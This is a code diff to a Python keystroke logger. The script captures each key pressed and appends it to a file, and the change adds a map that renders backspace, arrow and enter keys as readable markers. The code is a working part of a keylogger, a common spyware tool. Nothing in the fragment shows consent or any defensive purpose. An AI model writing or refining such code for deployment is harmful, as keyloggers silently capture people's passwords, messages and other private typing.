@@ -8,10 +8,19 @@ extension = "\\"
 count = 0
 keys = []
 
+replacement_map = {
+    "Key.backspace": "[<-]",
+    "Key.space": " ",
+    "Key.left": "[<]",
+    "Key.right": "[>]",
+    "Key.up": "[^]",
+    "Key.down": "[v]",
+    "Key.enter": "[enter]\n"
+}
+
 
 def on_press(key):
     global keys, count
-    print(f"key = {key}")
     keys.append(key)
     count += 1
 
@@ -26,22 +35,16 @@ def write_file(keys):
     fullpath = path + filename
     with open(fullpath, "a") as f:
         for key in keys:
+            print(f"key = {key}")
             # get rid of annoying single quotes
             k = sub(r"[\'\"](.*)[\'\"]", r"\1", str(key))
 
-            # print(f"k = {k}")
-            if k.find("space") > 0:
-                f.write('\n')
-                f.close()
+            if k in replacement_map:
+                f.write(replacement_map[k])
 
-            # in the case of non-special characters, write them out as is
-            elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
-
+            # in case of other special characters, get rid of the "key." bit
             else:
                 f.write(k.replace("Key.", "\n"))
-                f.close()
 
 
 def on_release(key):
